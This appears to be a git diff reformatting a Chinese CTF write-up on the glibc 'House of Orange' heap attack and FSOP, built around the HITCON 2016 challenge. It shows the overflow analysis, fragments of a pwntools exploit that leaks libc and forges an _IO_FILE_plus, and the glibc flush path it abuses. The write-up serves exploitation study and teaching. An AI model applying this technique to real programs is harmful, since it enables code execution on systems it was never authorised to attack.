@@ -1,38 +1,35 @@
 ---
 title: "House of orange"
-description: "若申请的 chunk 大小大于 top chunk 的 size 大小,则会将 top chunk 放入 unsorted bins; unsorted bins atk 将 _IO_list_all 覆写为 chunk 地址."
+description: "申请大于 top chunk 时，top chunk 会被放进 unsorted bin；再配合 unsorted bin attack 覆写 _IO_list_all，伪造 _IO_FILE_plus 走 FSOP。"
 pubDate: 2025-03-10
 category: pwn
 tags: [io-file]
 ---
 
-### 前言
-久仰 **house of orange** 大名.
-一研究发现其实不算难.
-FSOP第一次接触,觉得很惊奇.
+## 前言
 
-### House of orange
+久仰 **house of orange** 大名，真研究下来发现并不算难；FSOP 是第一次接触，思路很惊艳。
 
-#### 条件
-- 可以溢出到`top chunk`的`size`段.
+## House of orange
 
-#### 利用
-- 若申请的`chunk`大小大于`top chunk`的size大小,则会将`top chunk`放入`unsorted bins`.
+### 条件
+- 可以溢出到 `top chunk` 的 `size` 字段。
 
-### FSOP
+### 利用
+- 申请的 `chunk` 大于 `top chunk` 的 `size` 时，会把 `top chunk` 放进 `unsorted bin`。
 
-核心内容: 将`_IO_list_all`劫持,指向伪造的`_IO_FILE_plus`.
+## FSOP
 
-至于`_IO_flush_all_lockp`的触发,有三种情况:
-- 执行`abort`流程时
-- 执行`exit()`函数时
-- 正常结束`main()`函数(本质上就是情况二)
+核心是把 `_IO_list_all` 劫持到伪造的 `_IO_FILE_plus` 上。
 
-### example
+`_IO_flush_all_lockp` 会在三种情况下被触发：
+- 执行 `abort` 流程时
+- 执行 `exit()` 函数时
+- 正常结束 `main()` 函数（本质上就是情况二）
 
-#### house of orange
+## 示例
 
-> 来源: Hitcon 2016
+### HITCON 2016 house of orange
 
 ```C
 void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
@@ -85,7 +82,7 @@ LABEL_13:
 }
 ```
 
-##### 漏洞分析
+#### 漏洞分析
 ```C
 int upgrade()
 {
@@ -122,10 +119,10 @@ int upgrade()
   return puts("Finish");
 }
 ```
-在`upgrade()`中又对 *name* 的 **size** 进行了输入.
-这是非常显然的溢出漏洞.
+在 `upgrade()` 中又对 *name* 的 **size** 进行了输入。
+这是非常显然的溢出漏洞。
 
-##### exp
+#### exp
 ```python
 from pwn import *
 
@@ -138,11 +135,9 @@ libc = ELF('./libc-2.23.so')
 io = process('./houseoforange_hitcon_2016')
 gdb.attach(io, 'b *$rebase(0x13C6)')
 
-
 def cmd(c: int):
     io.recvuntil(b'Your choice : ')
     io.sendline(str(c).encode())
-
 
 def build(length: int, name: bytes, price: int = 1, color: int = 0xDDAA):
     cmd(1)
@@ -155,10 +150,8 @@ def build(length: int, name: bytes, price: int = 1, color: int = 0xDDAA):
     io.recvuntil(b'Color of Orange:')
     io.sendline(str(color).encode())
 
-
 def see():
     cmd(2)
-
 
 def upgrade(length: int, name: bytes, price: int = 1, color: int = 0xDDAA):
     cmd(3)
@@ -170,7 +163,6 @@ def upgrade(length: int, name: bytes, price: int = 1, color: int = 0xDDAA):
     io.sendline(str(price).encode())
     io.recvuntil(b'Color of Orange: ')
     io.sendline(str(color).encode())
-
 
 build(0x10, b'a')
 
@@ -202,7 +194,6 @@ malloc并不会清理chunk的内容
 所以,可以泄露libc内容
 '''
 
-
 see()
 io.recvuntil(b'c'*8)
 libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\0'))-0x3c5188
@@ -214,7 +205,6 @@ log.success('system: ' + hex(system))
 '''
 泄露libc
 '''
-
 
 upgrade(0x10, b'abcd'*4)
 see()
@@ -257,26 +247,26 @@ cmd(1)
 io.interactive()
 ```
 
-#### 后记
+### 后记
 
-##### 流程
-> 调用链: _libc_malloc -> malloc_printerr -> libc_message -> abort -> fflush(_IO_fflush) -> _IO_flush_all -> _IO_flush_all_lockp -> _IO_OVERFLOW
+#### 流程
+> 调用链：_libc_malloc -> malloc_printerr -> libc_message -> abort -> fflush(_IO_fflush) -> _IO_flush_all -> _IO_flush_all_lockp -> _IO_OVERFLOW
 
-##### 0x61
-关键在于`_IO_FILE`的`_chain`字段.
-若将`_IO_list_all`劫持为`main_arena+88`,那么对应的`_chain`应该是`main_arena+168`.
-而`main_arena+168`是 `small bin[0x60]`的位置.
+#### 0x61
+关键在于 `_IO_FILE` 的 `_chain` 字段。
+若将 `_IO_list_all` 劫持为 `main_arena+88`，那么对应的 `_chain` 应该是 `main_arena+168`.
+而 `main_arena+168` 是 `small bin[0x60]` 的位置。
 
-将`unsorted bins`中的chunk的size位覆盖为 **0x61**
+将 `unsorted bins` 中的 chunk 的 size 位覆盖为 **0x61**
 
-再`malloc`时会遍历`unsorted bins`,然后将`chunk`放到对应`small bins/lager bins`中
+再 `malloc` 时会遍历 `unsorted bins`，然后将 `chunk` 放到对应 `small bins/lager bins` 中
 
-这样就能控制链表的第二个元素,也就是我们伪造的`_IO_FILE_plus`结构体.
+这样就能控制链表的第二个元素，也就是我们伪造的 `_IO_FILE_plus` 结构体。
 
-##### 概率通过
+#### 概率通过
 
-这个问题的关键在于结构体的`_mode`字段.
-`_mode`字段需要是负数,若为正,则在遍历第一个`_IO_FILE`结构体就会触发`_IO_OVERFLOW`.
+这个问题的关键在于结构体的 `_mode` 字段。
+`_mode` 字段需要是负数，若为正，则在遍历第一个 `_IO_FILE` 结构体就会触发 `_IO_OVERFLOW`.
 ```C
 int
 _IO_flush_all_lockp (int do_lock) # do_lock = 1
@@ -333,4 +323,4 @@ _IO_flush_all_lockp (int do_lock) # do_lock = 1
 }
 ```
 
-而我们只控制了第二个结构体的`vtable`,程序就直接结束了.
+而我们只控制了第二个结构体的 `vtable`，程序就直接结束了。
